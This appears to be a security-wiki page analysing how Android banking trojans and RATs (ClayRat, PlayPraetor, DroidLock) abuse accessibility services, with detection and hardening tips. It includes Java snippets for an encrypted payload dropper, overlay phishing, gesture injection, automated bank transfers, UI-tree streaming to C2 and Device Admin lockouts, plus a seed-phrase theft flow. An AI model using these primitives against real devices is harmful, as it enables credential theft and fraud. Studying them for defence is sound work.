# Android Accessibility Service Abuse

{{#include ../../banners/hacktricks-training.md}}

## Overview

`AccessibilityService` was created to help users with disabilities interact with Android devices.  Unfortunately, the same **powerful automation APIs** (global navigation, text input, gesture dispatch, overlay windows…) can be weaponised by malware to gain **complete remote control** of the handset _without root privileges_.

Modern Android banking Trojans and Remote-Access-Trojans (RATs) such as **PlayPraetor, SpyNote, BrasDex, SOVA, ToxicPanda** and many others follow the same recipe:

1. Social-engineer the victim into enabling a rogue accessibility service (the *BIND_ACCESSIBILITY_SERVICE* permission is considered "high-risk" and requires an explicit user action).
2. Leverage the service to
   * capture every UI event & text that appears on screen,
   * inject synthetic gestures (`dispatchGesture`) and global actions (`performGlobalAction`) to automate any task the operator desires,
   * draw full-screen overlays on top of legitimate apps using the **TYPE_ACCESSIBILITY_OVERLAY** window type (no `SYSTEM_ALERT_WINDOW` prompt!),
   * silently grant additional runtime permissions by clicking on the system dialogs on the victim’s behalf.
3. Exfiltrate data or perform **On-Device-Fraud (ODF)** in real-time while the user is looking at a perfectly normal screen.

---

### Packed Accessibility droppers

ClayRat v3.0.8 couples its Accessibility RAT with a staged payload hidden under `assets/`. At runtime the host APK:

1. Streams the encrypted blob from `assets/*.dat`.
2. Decrypts it with a hard-coded AES/CBC key + IV embedded inside the Java/Kotlin loader.
3. Writes the plaintext DEX to the app's private dir and loads it via `DexClassLoader`, exposing the actual spyware classes only in memory.

```java
byte[] blob = readAsset("payload.enc");
Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
SecretKeySpec key = new SecretKeySpec(hex("A1..."), "AES");
c.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(iv));
byte[] dex = c.doFinal(blob);
DexClassLoader cl = new DexClassLoader(writeTemp(dex), getCodeCacheDir().getPath(), null, getClassLoader());
cl.loadClass("com.clayrat.Core").newInstance();
```

This packing pattern (ATT&CK T1406.002) keeps the Accessibility module off-disk until the dropper executes, defeating static signature scans and Play Protect until the user already granted the dangerous permissions.

---

## Requesting the permission

```xml
<!-- AndroidManifest.xml -->
<service
    android:name="com.evil.rat.EvilService"
    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
    android:exported="false">

    <intent-filter>
        <action android:name="android.accessibilityservice.AccessibilityService" />
    </intent-filter>

    <meta-data android:name="android.accessibilityservice"
        android:resource="@xml/evil_accessibility_config"/>
</service>
```

The companion XML defines how the fake dialog will look like:

```xml
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/service_description"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:notificationTimeout="200"
    android:canPerformGestures="true"
    android:canRetrieveWindowContent="true"/>
```

---

## Remote UI automation primitives

<details>
<summary>Accessibility service automation skeleton</summary>

```java
public class EvilService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // harvest text or detect foreground app change
    }

    // Simulate HOME / BACK / RECENTS …
    private void navHome()     { performGlobalAction(GLOBAL_ACTION_HOME); }
    private void navBack()     { performGlobalAction(GLOBAL_ACTION_BACK); }
    private void openRecents() { performGlobalAction(GLOBAL_ACTION_RECENTS); }

    // Generic tap / swipe
    public void tap(float x, float y) {
        Path p = new Path(); p.moveTo(x, y);
        GestureDescription.StrokeDescription s = new GestureDescription.StrokeDescription(p, 0, 50);
        dispatchGesture(new GestureDescription.Builder().addStroke(s).build(), null, null);
    }
}
```

</details>

With only these two APIs an attacker can:
* Unlock the screen, open the banking app, navigate its UI tree and submit a transfer form.
* Accept every permission dialog that pops up.
* Install/update extra APKs via the Play Store intent.

---

## Abuse patterns

### 1. Overlay Phishing (Credential Harvesting)
A transparent or opaque `WebView` is added to the window manager:

```java
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
        MATCH_PARENT, MATCH_PARENT,
        TYPE_ACCESSIBILITY_OVERLAY,                      // ⬅ bypasses SYSTEM_ALERT_WINDOW
        FLAG_NOT_FOCUSABLE | FLAG_NOT_TOUCH_MODAL,       // touches still reach the real app
        PixelFormat.TRANSLUCENT);
wm.addView(phishingView, lp);
```

The victim types credentials into the fake form while the background app receives the same gestures – no suspicious "draw over other apps" prompt is ever shown.

> Detailed example: the *Accessibility Overlay Phishing* section inside the Tapjacking page.

ClayRat exposes this capability with the `show_block_screen` / `hide_block_screen` commands that download overlay templates from the C2. Operators can switch layouts on the fly to:

- **Black out** the panel so the victim assumes the handset is off or frozen while automated gestures disable Play Protect or grant more permissions.
- Display fake **system update / battery optimization** panels that justify why the device is “busy” while background automation continues.
- Show an **interactive PIN pad** overlay that mirrors the system lock screen—the malware captures every digit and streams it to the operator as soon as a 4‑digit code is entered.

Because TYPE_ACCESSIBILITY_OVERLAY windows never raise the `SYSTEM_ALERT_WINDOW` permission prompt, the victim only sees the decoy UI while the RAT keeps interacting with the real apps underneath.

### 2. On-Device Fraud automation
Malware families such as **PlayPraetor** maintain a persistent WebSocket channel where the operator can issue high-level commands (`init`, `update`, `alert_arr`, `report_list`, …).  The service translates those commands into the low-level gestures above, achieving real-time unauthorized transactions that easily bypass multi-factor-authentication tied to that very device.

### 3. Screen streaming & monitoring
ClayRat upgrades the usual MediaProjection trick into a remote desktop stack:

1. `turbo_screen` triggers the MediaProjection consent dialog; the Accessibility service clicks “Start now” so the victim never intervenes.
2. With the resulting `MediaProjection` token it creates a `VirtualDisplay` backed by an `ImageReader`, keeps a `ForegroundService` alive, and drains frames on worker threads.
3. Frames are JPEG/PNG encoded according to the operator-supplied `set_quality` parameter (defaults to `60` when missing) and shipped over an HTTP→WebSocket upgrade advertising the custom `ClayRemoteDesktop` user-agent.
4. `start_desktop` / `stop_desktop` manage the capture threads while `screen_tap`, `screen_swipe`, `input_text`, `press_home`, `press_back` and `press_recents` replay gestures against the live framebuffer.

The result is a VNC-like feed delivered entirely through sanctioned APIs—no root or kernel exploits—yet it hands the attacker live situational awareness with millisecond latency.

### 4. Lock-screen credential theft & auto-unlock
ClayRat subscribes to `TYPE_WINDOW_CONTENT_CHANGED` / `TYPE_VIEW_TEXT_CHANGED` events emitted by `com.android.systemui` (`Keyguard`). It reconstructs whatever guard is active:

- **PIN** – watches keypad button presses until the locker reports completion.
- **Password** – concatenates strings seen in the focused password field for each `AccessibilityEvent`.
- **Pattern** – records the ordered node indices inferred from gesture coordinates across the 3×3 grid.

Secrets plus metadata (lock type + timestamp) are serialized into `SharedPreferences` under `lock_password_storage`. When the operator pushes `auto_unlock`, the service wakes the device with `unlock_device` / `screen_on`, replays the stored digits or gestures through `dispatchGesture`, and silently bypasses the keyguard so subsequent ODF workflows can continue.

### 5. Notification phishing & harvesting
A companion Notification Listener turns the shade into a phishing surface:

- `get_push_notifications` dumps every currently visible notification, including OTP / MFA messages.
- The `notifications` command toggles a `notifications_enabled` flag so each future `onNotificationPosted()` payload is streamed to the C2 in real time.
- `send_push_notification` lets operators craft fake, interactive notifications that impersonate banking or chat apps; any text the victim submits is parsed as credentials and exfiltrated immediately.

Because Accessibility can open/dismiss the notification shade programmatically, this method harvests secrets without touching the targeted apps.

### 6. Telephony & SMS command channel
After coercing the user into setting the RAT as the default SMS app, the following commands provide complete modem control:

- `send_sms` and `retransmishion` send arbitrary or replayed messages to attacker-controlled numbers.
- `messsms` iterates over the entire contacts database to spam phishing links for worm-like propagation.
- `make_call` initiates voice calls that support social-engineering workflows.
- `get_sms_list` / `get_sms` and `get_call_log` / `get_calls` dump inboxes and call history so MFA codes or call metadata can be abused instantly.

Combined with Accessibility-driven UI navigation, ClayRat can receive an OTP via notification/SMS and immediately input it inside the target banking or enterprise app.

### 7. Discovery, collection & proxying
Additional ClayRat commands map the environment and keep C2 resilient:

- `get_apps` / `get_apps_list` enumerate installed packages (ATT&CK T1418).
- `get_device_info` reports model, OS version and battery state (T1426).
- `get_cam` / `get_camera` capture front-camera stills, while `get_keylogger_data` serializes lock PINs plus passwords, view descriptions and hints scraped from sensitive fields.
- `get_proxy_data` fetches a proxy WebSocket URL, appends the unique device ID and spins a job that tunnels HTTP/HTTPS over the same bidirectional channel (T1481.002 / T1646).

---

## PlayPraetor – command & control workflow

1. **HTTP(S) heartbeat** – iterate over a hard-coded list until one domain answers `POST /app/searchPackageName` with the active C2.
2. **WebSocket (port 8282)** – bidirectional JSON commands:
   * `update` – push new conf/APKs
   * `alert_arr` – configure overlay templates
   * `report_list` – send list of targeted package names
   * `heartbeat_web` – keep-alive
3. **RTMP (port 1935)** – live screen/video streaming.
4. **REST exfiltration** –
   * `/app/saveDevice` (fingerprint)
   * `/app/saveContacts` | `/app/saveSms` | `/app/uploadImageBase64`
   * `/app/saveCardPwd` (bank creds)

The **AccessibilityService** is the local engine that turns those cloud commands into physical interactions.

---

## DroidLock: Accessibility + Device Admin ransomware workflow

### Staged delivery to keep abusing Accessibility
* **Dropper ➜ payload**: DroidLock first sideloads a seemingly harmless APK that only asks for `BIND_ACCESSIBILITY_SERVICE`. Once the victim turns the service on, the dropper installs/launches the second stage despite recent Android fraud mitigations because every subsequent dialog (install unknown apps, notification access, default SMS app, microphone, contacts, etc.) is automatically confirmed through synthetic `performGlobalAction()` clicks.
* **Permission chaining**: The second stage immediately enables `NotificationListenerService`, SMS/contacts/call-log access and microphone/screen-capture prompts without further human input, giving the operator the same reach as a fully privileged user-mode agent while staying inside sanctioned APIs.

### Package-aware overlays and pattern theft
DroidLock subscribes to `AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED`, correlates the foreground package with two C2-managed lists and reacts instantly:

```java
@Override
public void onAccessibilityEvent(AccessibilityEvent event) {
    if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;
    String pkg = String.valueOf(event.getPackageName());
    if (lockTargets.contains(pkg)) { showPatternOverlay(patternLayout); return; }
    String html = overlayDb.get(pkg);
    if (html != null) showWebViewOverlay(html);
}
```

* **`APP_BLOCK_LOCK_PATTERN`** pushes package names that should trigger a pre-built 3×3 pattern layout stored under `assets/`, allowing attackers to harvest the unlock gesture in front of the real banking/app screen.
* **`INJECT_APP`** keeps a local database that maps package⇢HTML templates, so the RAT can instantly launch a full-screen WebView phishing overlay for any targeted brand (bank, telco, enterprise app) without shipping a new APK.
* **Fake update blockers**: `BLACK_SCREEN` and `BLACK_SCREEN_UPDATE_SYSTEM` commands render opaque overlays that either mimic an OS update or a powered-off display, keeping the victim idle while ATS routines steal data underneath.

### DevicePolicyManager-backed lockout pressure
Once the operator fires the `DEVICE_ADMIN` command and the user grants it, DroidLock weaponises the legitimate `DevicePolicyManager` API:

* `BLOCK_BIOMETRIC` calls `setKeyguardDisabledFeatures()` to disable biometric/PIN unlocks so overlays can coerce the victim to re-enter PINs/patterns.
* `RANSOMWARE` spawns a WebView-based ransom note that blocks the UI for 24 hours unless the victim emails the attacker; the threat is credible because `WIPE` calls `dpm.wipeData(0)` and `lockNow()` can immediately brick access.
* `APP_BLOCK` lets the C2 specify packages that should be instantly covered/closed, usually AV, MDM or banking apps, while `UNINSTALL_APP` issues silent removals of supplied package names.

The result is ransomware without encryption—Device Admin alone provides screen locks, forced credential resets and remote factory resets that keep the victim locked out until the ransom is paid.

### WebSocket orchestration with a 15-command dictionary
After an initial HTTP registration (device fingerprint, geodata, installed apps), DroidLock upgrades to a bidirectional WebSocket session used for real-time tasking:

* **Privilege & lockdown**: `DEVICE_ADMIN`, `BLOCK_BIOMETRIC`, `WIPE`, `TURNSCREENON`.
* **Deception & phishing**: `RANSOMWARE`, `BLACK_SCREEN*`, `NOTIFICATION` (spoof arbitrary notifications), `INJECT_APP`.
* **Overlay targeting**: `APP_BLOCK`, `APP_BLOCK_LOCK_PATTERN` keep overlay target lists fresh without redeploying the client.
* **Remote control**: `VNC` toggles continuous input replay, `TURNSCREENON`/`screen_on` keep the display awake, `MUTE` silences the device, `CAMERA` captures stills, and `UNINSTALL_APP` removes defensive packages.

Because the channel is persistent, operators can orchestrate complete on-device fraud loops (open bank app ➜ inject overlay ➜ intercept OTP ➜ dismiss alarms) with desktop-like latency.

### Screen streaming + notification harvesting
* The `RANSOMWARE`/`VNC` flows reuse Accessibility to accept the MediaProjection consent dialog, spin up a `VirtualDisplay`, capture frames as JPEG, base64-encode them and exfiltrate them over the WebSocket feed, effectively turning the handset into a VNC endpoint.
* A bundled `NotificationListenerService` tied to the same command channel dumps OTP/2FA notifications via `NOTIFICATION`/`notifications` commands and can craft arbitrary push lures to nudge the victim into sensitive workflows.
* `TURNSCREENON`, `screen_on` and `screen_tap` ensure the attacker can wake the panel, inject gestures and watch the result even if the victim tries to power the device off.

Zimperium also published the associated [IOC set for DroidLock](https://github.com/Zimperium/IOC/tree/master/2025-12-DroidLock), which documents the observed APK hashes, overlay templates and C2 infrastructure that implement the workflow above.

---

## Detecting malicious accessibility services

* `adb shell settings get secure enabled_accessibility_services`
* Settings → Accessibility → *Downloaded services* – look for apps that are **not** from Google Play.
* MDM / EMM solutions can enforce `ACCESSIBILITY_ENFORCEMENT_DEFAULT_DENY` (Android 13+) to block sideloaded services.
* Analyse running services:
  ```bash
  adb shell dumpsys accessibility | grep "Accessibility Service"
  ```

---

## Hardening recommendations for app developers

* Mark sensitive views with `android:accessibilityDataSensitive="accessibilityDataPrivateYes"` (API 34+).
* Combine `setFilterTouchesWhenObscured(true)` with `FLAG_SECURE` to prevent tap/overlay hijacking.
* Detect overlays by polling `WindowManager.getDefaultDisplay().getFlags()` or the `ViewRootImpl` API.
* Refuse to operate when `Settings.canDrawOverlays()` **or** a non-trusted Accessibility service is active.

---

## ATS automation cheat-sheet (Accessibility-driven)
Malware can fully automate a bank app with only Accessibility APIs. Generic primitives:

<details>
<summary>Helper methods for ATS automation</summary>

```java
// Helpers inside your AccessibilityService
private List<AccessibilityNodeInfo> byText(String t){
  AccessibilityNodeInfo r = getRootInActiveWindow();
  return r == null ? Collections.emptyList() : r.findAccessibilityNodeInfosByText(t);
}
private boolean clickText(String t){
  for (AccessibilityNodeInfo n: byText(t)){
    if (n.isClickable()) return n.performAction(ACTION_CLICK);
    AccessibilityNodeInfo p = n.getParent();
    if (p != null) return p.performAction(ACTION_CLICK);
  }
  return false;
}
private void inputText(AccessibilityNodeInfo field, String text){
  Bundle b = new Bundle(); b.putCharSequence(ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
  field.performAction(ACTION_SET_TEXT, b);
}
private void tap(float x, float y){
  Path p = new Path(); p.moveTo(x,y);
  dispatchGesture(new GestureDescription.Builder()
    .addStroke(new GestureDescription.StrokeDescription(p,0,40)).build(), null, null);
}
```

</details>

Example flow (Czech → English labels):
- "Nová platba" (New payment) → click
- "Zadat platbu" (Enter payment) → click
- "Nový příjemce" (New recipient) → click
- "Domácí číslo účtu" (Domestic account number) → focus and `ACTION_SET_TEXT`
- "Další" (Next) → click → … "Zaplatit" (Pay) → click → enter PIN

Fallback: hard-coded coordinates with `dispatchGesture` when text lookup fails due to custom widgets.

Also seen: pre-steps to `check_limit` and `limit` by navigating to limits UI and increasing daily limits before transfer.

## Text-based pseudo-screen streaming
For low-latency remote control, instead of full video streaming, dump a textual representation of the current UI tree and send it to C2 repeatedly.

```java
private void dumpTree(AccessibilityNodeInfo n, String indent, StringBuilder sb){
  if (n==null) return;
  Rect b = new Rect(); n.getBoundsInScreen(b);
  CharSequence txt = n.getText(); CharSequence cls = n.getClassName();
  sb.append(indent).append("[").append(cls).append("] ")
    .append(txt==null?"":txt).append(" ")
    .append(b.toShortString()).append("\n");
  for (int i=0;i<n.getChildCount();i++) dumpTree(n.getChild(i), indent+"  ", sb);
}
```

This is the basis for commands like `txt_screen` (one-shot) and `screen_live` (continuous).

## Device Admin coercion primitives
Once a Device Admin receiver is activated, these calls increase opportunities to capture credentials and maintain control:

```java
DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
ComponentName admin = new ComponentName(this, AdminReceiver.class);

// 1) Immediate lock
dpm.lockNow();

// 2) Force credential change (expire current PIN/password)
dpm.setPasswordExpirationTimeout(admin, 1L); // may require owner/profile-owner on recent Android

// 3) Disable biometric unlock to force PIN/pattern entry
int flags = DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
            DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS;
dpm.setKeyguardDisabledFeatures(admin, flags);
```

Note: the exact availability of these policies varies by Android version and OEM; validate the device policy role (admin vs owner) during testing.

## Crypto wallet seed-phrase extraction patterns
Observed flows for MetaMask, Trust Wallet, Blockchain.com and Phantom:
- Unlock with stolen PIN (captured via overlay/Accessibility) or provided wallet password.
- Navigate: Settings → Security/Recovery → Reveal/Show recovery phrase.
- Collect phrase via keylogging the text nodes, secure-screen bypass, or screenshot OCR when text is obscured.
- Support multiple locales (EN/RU/CZ/SK) to stabilise selectors – prefer `viewIdResourceName` when available, fallback to multilingual text matching.

## NFC-relay orchestration
Accessibility/RAT modules can install and launch a dedicated NFC-relay app (e.g., NFSkate) as a third stage and even inject an overlay guide to shepherd the victim through card-present relay steps.

Background and TTPs: https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay

---

## References
* [Total Takeover: DroidLock Hijacks Your Device](https://zimperium.com/blog/total-takeover-droidlock-hijacks-your-device)
* [DroidLock IoCs (Zimperium)](https://github.com/Zimperium/IOC/tree/master/2025-12-DroidLock)
* [Return of ClayRat: Expanded Features and Techniques](https://zimperium.com/blog/return-of-clayrat-expanded-features-and-techniques)
* [ClayRat v3 IoCs (Zimperium)](https://github.com/Zimperium/IOC/tree/master/2025-12-ClayRatv3)
* [PlayPraetor’s evolving threat: How Chinese-speaking actors globally scale an Android RAT](https://www.cleafy.com/cleafy-labs/playpraetors-evolving-threat-how-chinese-speaking-actors-globally-scale-an-android-rat)
* [Android accessibility documentation – Automating UI interaction](https://developer.android.com/guide/topics/ui/accessibility/service)
* [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
* [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

{{#include ../../banners/hacktricks-training.md}}